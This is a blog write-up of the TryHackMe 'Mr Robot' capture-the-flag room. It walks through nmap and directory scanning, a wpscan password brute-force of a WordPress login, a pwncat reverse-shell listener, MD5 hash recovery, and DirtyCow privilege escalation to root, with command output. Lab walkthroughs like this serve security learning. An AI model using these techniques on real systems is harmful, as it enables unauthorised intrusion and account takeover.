---
layout: post
title: Mr RobotCTF Writeup
date: 2020-09-21 00:00:00 +5:30
categories: [TryHackMe, Medium]
tags: [tryhackme, hashcracking, wordpress, GTFO] # add tag
image: /assets/img/mrrobot/mrrobot.jpg
---

## Description

The Following Post is writeup of Mr RobotCTF room of tryhackme <https://tryhackme.com/room/mrrobot>

|Machine|Detail
|:---|:--
|OS | Linux
|Rating | Medium
|Creator | Leon Johnson

## Summary

The machine have 2 open ports 80 and 443. So basically there is webserver.
By Dirbusting the server we will get robots file and wp-login(wordpress).
In robots file we got a dictonary. BruteForce it against the login and then gain reverse shell.
We will get md5 hash or user robot, crack it and get the user. From user i found two ways.
There is dirty cow exploit and another is through nmap.

## Walkthrough

### Enumeration

```bash
┌─[argenestel@parrot]─[~/Desktop/tryhackme/robotctf]
└──╼ $nmap -sC -sV -oN nmap/robot 10.10.183.108
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-21 12:11 IST
Nmap scan report for 10.10.183.108
Host is up (0.30s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.21 seconds
```

so from nmap scan we got two ports only
On checking 443 i didn't really get anything so i moved on to port 80

#### port 80

![Webpage](/assets/img/mrrobot/port80.png)

So we can see few links after the Webpage loaded.
Moving on to dirbust.

```bash
/images (Status: 301)
/blog (Status: 301)
/sitemap (Status: 200)
/rss (Status: 301)
/login (Status: 302)
/0 (Status: 301)
/video (Status: 301)
/feed (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 301)
/audio (Status: 301)
/intro (Status: 200)
/wp-login (Status: 200)
/css (Status: 301)
/rss2 (Status: 301)
/license (Status: 200)
/wp-includes (Status: 301)
/js (Status: 301)
/Image (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/readme (Status: 200)
/robots (Status: 200)
/dashboard (Status: 302)
```
![robots](/assets/img/mrrobot/fsocdic.png)

Okay so we have 1st flag and wordlist.

so we can see login too.

Hmm wordpress so we have dictonary we can BruteForce it.
Idk the username tbh it got me I was stuck here So i tried some common username and nothing worked.
Looking into some already made writeup make me realise that... Aw man I can BruteForce user too.
But Yeah the username was elliot so all i have to do is BruteForce for Password.

Upon checking the wordlist i found out there are 80,000+ lines.
Gonna take long man.
But see everything is repeated almost 8 times (Aw thats something bad).

```terminal
sort fsociety.dic |uniq > uniq.list
```

so i got ~11000 lines ahh not bad let's start wpscan.

#### Exploitation

so we are now going to upload a reverse shell.

```bash
┌─[argenestel@parrot]─[~/Desktop/tryhackme/robotctf]
└──╼ $wpscan --url http://mrrobot.thm -P uniq.list --usernames elliot
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://mrrobot.thm/ [10.10.239.89]
[+] Started: Mon Sep 21 15:01:08 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://mrrobot.thm/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://mrrobot.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] The external WP-Cron seems to be enabled: http://mrrobot.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://mrrobot.thm/9afcb29.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://mrrobot.thm/9afcb29.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://mrrobot.thm/wp-content/themes/twentyfifteen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://mrrobot.thm/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 2.7
 | Style URL: http://mrrobot.thm/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://mrrobot.thm/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <============================================> (21 / 21) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - elliot / ER28-0652                                                                                           
All Found                                                                                                                
Progress Time: 00:03:44 <==================================                             > (12 / 22) 54.54%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: elliot, Password: ER28-0652

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Mon Sep 21 15:05:01 2020
[+] Requests Done: 36
[+] Cached Requests: 36
[+] Data Sent: 9.049 KB
[+] Data Received: 1.246 MB
[+] Memory used: 248.34 MB
[+] Elapsed time: 00:03:53
```
![Shell](/assets/img/mrrobot/revshell.png)

uploaded php shell let's execute it

we have pwncat listening.

```bash
┌─[argenestel@parrot]─[~/Desktop/tryhackme/robotctf]
└──╼ $pwncat --listen --port 1234
[15:37:16] received connection from 10.10.239.89:51343                                                     connect.py:148
[15:37:18] new host w/ hash 243b586998c75238b33cb10b9ad0ab52                                                victim.py:325
[15:37:31] pwncat running in /bin/sh                                                                        victim.py:358
[15:37:39] pwncat is ready 🐈                                                                               victim.py:768


(remote) daemon@linux:/$




daemon@linux:/home$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
daemon@linux:/home$ cd robot/
daemon@linux:/home/robot$ ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
daemon@linux:/home/robot$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
daemon@linux:/home/robot$
```
so we can crack the hash and get

#### PrivEsc

```bash
robot@linux:~$ id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
robot@linux:~$
```

okay so got robot user.
since the kernel version was old i ran exploit suggester to find out exploit (from linpeas)

```bash
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

robot@linux:/tmp$ chmod 777 cowroot
robot@linux:/tmp$ ./cowroot
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 47032
Racing, this may take a while..
thread stopped
thread stopped
/usr/bin/passwd overwritten
Popping root shell.
Don't forget to restore /tmp/bak
root@linux:/tmp#
```

so i rooted using dirty cow but as we can see nmap is also there.

so rooting through nmap is also possible.

<https://gtfobins.github.io/gtfobins/nmap/>


### Reviews

Good Machine. I will really rate it a bit CTFy. But yeah i learned few things from this one. Try it out
